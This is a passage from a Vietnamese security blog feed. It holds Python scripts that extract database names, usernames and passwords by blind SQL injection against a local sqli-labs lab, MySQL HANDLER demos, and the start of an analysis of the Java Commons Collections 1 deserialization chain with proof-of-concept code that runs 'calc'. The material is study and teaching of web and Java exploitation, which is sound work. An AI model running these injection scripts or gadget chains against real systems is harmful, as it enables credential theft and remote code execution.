class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập database của table: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">db_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập table: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">tb_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line">value = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># -------</span></span><br><span class="line">all_value = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;|&#125;~&quot;</span>:</span><br><span class="line">            payload = <span class="string">&quot;1&#x27; and (&#x27;&#123;&#125;&#x27;,&#x27;&#x27;,&#x27;&#x27;)&lt;=(table &#123;&#125;.&#123;&#125; limit &#123;&#125;,1)-- -&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                value + j, db_name, tb_name, <span class="built_in">str</span>(index))</span><br><span class="line">            <span class="built_in">print</span>(value + j)</span><br><span class="line">            payload_encoded = urllib.parse.quote(payload)</span><br><span class="line">            r = requests.get(url=url+payload_encoded)</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># print(r.text)</span></span><br><span class="line">                <span class="keyword">if</span> j == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                value += <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> value == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    all_value.append(value)</span><br><span class="line">    value = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All value:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(all_value)</span><br></pre></td></tr></table></figure><p>Dump username</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">&#x27;http://localhost/Less-1/?id=&#x27;</span></span><br><span class="line"><span class="comment"># nhập các giá trị</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập database của table: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">db_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập table: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">tb_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập id: &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">id</span> = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập index của id: &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">index = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="comment"># vì chúng ta biết được index của id từ script đầu tiên rồi</span></span><br><span class="line">value = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># -------</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;|&#125;~&quot;</span>:</span><br><span class="line">        payload = <span class="string">&quot;1&#x27; and (&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#x27;)&lt;=(table &#123;&#125;.&#123;&#125; limit &#123;&#125;,1)-- -&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            <span class="built_in">id</span>, value + j, db_name, tb_name, index)</span><br><span class="line">        <span class="built_in">print</span>(value + j)</span><br><span class="line">        payload_encoded = urllib.parse.quote(payload)</span><br><span class="line">        r = requests.get(url=url+payload_encoded)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            value += <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Giá trị cần tìm là: &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure><p>Dump password:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Dump username</span><br><span class="line">```python</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">&#x27;http://localhost/Less-1/?id=&#x27;</span></span><br><span class="line"><span class="comment"># nhập các giá trị</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập database của table: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">db_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập table: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">tb_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập id: &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">id</span> = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập username: &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">username = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập index của id: &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">index = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="comment"># vì chúng ta biết được index của id từ script đầu tiên rồi</span></span><br><span class="line">value = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># -------</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;|&#125;~&quot;</span>:</span><br><span class="line">        payload = <span class="string">&quot;1&#x27; and (&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;)&lt;=(table &#123;&#125;.&#123;&#125; limit &#123;&#125;,1)-- -&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            <span class="built_in">id</span>,username, value + j, db_name, tb_name, index)</span><br><span class="line">        <span class="built_in">print</span>(value + j)</span><br><span class="line">        payload_encoded = urllib.parse.quote(payload)</span><br><span class="line">        r = requests.get(url=url+payload_encoded)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            value += <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Giá trị cần tìm là: &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure><h2 id="HANDLER-Statement"><a href="#HANDLER-Statement" class="headerlink" title="HANDLER Statement"></a>HANDLER Statement</h2><h3 id="Systax"><a href="#Systax" class="headerlink" title="Systax:"></a>Systax:</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; <span class="operator">=</span> <span class="operator">|</span> <span class="operator">&lt;=</span> <span class="operator">|</span> <span class="operator">&gt;=</span> <span class="operator">|</span> <span class="operator">&lt;</span> <span class="operator">|</span> <span class="operator">&gt;</span> &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; <span class="keyword">FIRST</span> <span class="operator">|</span> NEXT <span class="operator">|</span> PREV <span class="operator">|</span> <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; <span class="keyword">FIRST</span> <span class="operator">|</span> NEXT &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> HANDLER users <span class="keyword">OPEN</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> HANDLER users read <span class="keyword">first</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Dumb     <span class="operator">|</span> Dumb     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> HANDLER users read next;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Angelina <span class="operator">|</span> I<span class="operator">-</span>kill<span class="operator">-</span>you <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+------------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> HANDLER users read next;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> Dummy    <span class="operator">|</span> p<span class="variable">@ssword</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">Để về lại từ đầu chúng ta sẽ bắt đầu lại từ <span class="keyword">first</span></span><br><span class="line">mysql<span class="operator">&gt;</span> HANDLER users read <span class="keyword">first</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Dumb     <span class="operator">|</span> Dumb     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><p>Alias tên bảng:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> handler users <span class="keyword">open</span> <span class="keyword">as</span> rayin;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> handler rayin read <span class="keyword">first</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Dumb     <span class="operator">|</span> Dumb     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> handler rayin read next;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Angelina <span class="operator">|</span> I<span class="operator">-</span>kill<span class="operator">-</span>you <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tinh-nang-moi-cua-mysql8&quot;&gt;&lt;a href=&quot;#Tinh-nang-moi-cua-mysql8&quot; class=&quot;headerlink&quot; title=&quot;Tính năng mới của mysql8&quot;&gt;&lt;/a&gt;Tính năng mới </summary>
      
    
    
    
    <category term="Mysql" scheme="https://rayinaw.github.io/categories/Mysql/"/>
    
    <category term="SQLi" scheme="https://rayinaw.github.io/categories/Mysql/SQLi/"/>
    
    
    <category term="Mysql" scheme="https://rayinaw.github.io/tags/Mysql/"/>
    
    <category term="SQLi" scheme="https://rayinaw.github.io/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>Phân tích chuỗi Commons Collections 1 với TransformedMap</title>
    <link href="https://rayinaw.github.io/2022/11/04/Commons-Collections1-TransformedMap/"/>
    <id>https://rayinaw.github.io/2022/11/04/Commons-Collections1-TransformedMap/</id>
    <published>2022-11-04T11:00:38.000Z</published>
    <updated>2022-12-15T10:22:20.550Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Mot-vai-khai-niem-can-nam"><a href="#Mot-vai-khai-niem-can-nam" class="headerlink" title="Một vài khái niệm cần nắm"></a>Một vài khái niệm cần nắm</h2><p>Trước tiên chúng ta cần hình dung lớp Runtime sẽ exec câu lệnh như nào, ở đây mình có sử dụng kiến thức reflection mà mình đã có bài viết về nó, các bạn có thể tham khảo thêm.</p><ul><li>Lớp java.lang.reflect.Method có phương thức invoke, nó dùng để invoke method của object được truyền vào ở tham số đầu tiên, và với các tham số của method này là Object args (tham số lưu dưới dạng object).<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj, Object... args)</span>  <span class="keyword">throws</span> IllegalAccessException,  </span><br><span class="line">               IllegalArgumentException,  </span><br><span class="line">                InvocationTargetException  </span><br></pre></td></tr></table></figure></li><li>Trong lớp Runtime có phương thức exec dùng để exec câu lệnh trên system.</li><li>Bây giờ mình sẽ thực hiện invoke method exec của lớp runtime, vì nó là method private nên để sử dụng chúng ta cần setAccessible(“true”).<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">runtime</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> Runtime.class.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,  String.class);</span><br><span class="line">        execMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        execMethod.invoke(runtime, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="Phân tích"></a>Phân tích</h2><p>Sơ đồ tóm tắt chuỗi.<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/mindmap.png"></p><h3 id="InvokerTransformer-transform"><a href="#InvokerTransformer-transform" class="headerlink" title="InvokerTransformer.transform"></a>InvokerTransformer.transform</h3><p>Chain này bắt đầu từ lớp InvokerTransformer. Lớp này implements interface Transformer.</p><p>Hàm tạo của lớp InvokerTransformer:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/InvokerTransformerConstructor.png"></p><ul><li><code>Object[] args</code> ở đây nhận một Object với kiểu String.</li><li><code>Class[] paramTypes</code> nhận một Object của lớp Class</li></ul><p>Trong trường structure tìm đến method transform trong class InvokerTransformer ta thấy:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/InvokerTransformerTransform.png"></p><ul><li>Đầu tiên, nó thực hiện lấy class của object input là tham số của phương thức transform.</li><li>Tiếp theo nó thực hiện lấy phương thức với tên phương thức là tham số iMethodName của object của lớp InvokerTransformer, và iParamTypes là lớp đại diện cho kiểu tham số của phương thức này rồi gán vào object method có kiểu là Method.<br>Sau đó nó thực hiện invoke method là iMethodName của của object input với tham số là iArgs.</li></ul><p>Có nghĩa khi chúng ta thực hiện <code>invoker.transform(object)</code> nó sẽ tương đương với việc chúng ta thực hiện invoke() method chứa trong biến invoker của object. Vậy nên ở đây chúng ta có thể sử dụng lớp InvokerTransformer để thực hiện lệnh exec của lớp Runtime.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, cmd);</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br><span class="line">        <span class="comment">//Runtime.getRuntime() trả về một object của lớp Runtime</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tiếp theo chúng ta cần tìm lớp nào gọi đến phương thức transform của lớp InvokerTransformer.</p><p><code>Ctrl + Chuột trái</code> click vào phương thức transform:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/ClassesCallMethodTransform.png"></p><p>Phương thức này có nhiều lớp gọi đến, nhưng để có ảnh hưởng lead to CC1 chỉ có 2 lớp là TranformedMap và LazyMap. Bài viết này mình sẽ phân tích theo hướng TranformedMap. LazyMap mình sẽ phân tích sau. Cùng phân tích thôi nào~</p><h3 id="TransformedMap-checkSetValue"><a href="#TransformedMap-checkSetValue" class="headerlink" title="TransformedMap.checkSetValue"></a>TransformedMap.checkSetValue</h3><p>Hàm này có 3 phương thức gọi đến method transform là <code>checkSetValue</code>, <code>transformValue</code> và <code>transformKey</code>. Tuy nhiên phương thức chúng ta cần đi vào là <code>checkSetValue</code> bởi vì nó được sử dụng ở những lớp khác và kéo theo một chuỗi gadget.</p><p>Phương thức checkSetValue:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/TransformedMap-checkSetValue.png"></p><p>Nhìn vào phương thức này chúng ta thấy khá tương đồng với đoạn code ngắn để exec calc với lớp InvokerTranformer rồi phải không.</p><p>Bây giờ chúng ta sẽ xem valueTransformer là gì:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/TransformedMap-Constructor.png"></p><p>valueTransformer là một object của lớp Transformer.</p><p>Hàm tạo này khai báo protected nên không thể tạo trực tiếp, chúng ta cần tìm phương thức trả về object của lớp này.</p><p>Trong lớp này có phương thức decorate return một object của TransformedMap, các tham số đầu vào tương ứng với các tham số của hàm tạo TransformedMap. Chúng ta sẽ dùng phương thức này để tạo gián tiếp một object của lớp TransformedMap.</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/TransformedMap-decorate-png.png"></p><p>valueTransformer là một object kiểu Transformer nên chúng ta có thể truyền vào một object kiểu InvokerTransformer vì thằng này implements Transformer. Phương thức checkSetValue là phương thức protected nên chúng ta cần dùng reflection để gọi đến phương thức này. </p><p>Chuỗi poc ngắn từ TranformedMap:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">runtime</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        String[] argsRuntime = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, argsRuntime);</span><br><span class="line">        <span class="type">TransformedMap</span> <span class="variable">transformedMap</span> <span class="operator">=</span> (TransformedMap) TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> TransformedMap.class.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method.invoke(transformedMap, Runtime.getRuntime());</span><br><span class="line">        <span class="comment">//tham số của checkSetValue sẽ được truyền bào phương thức transform nên chúng 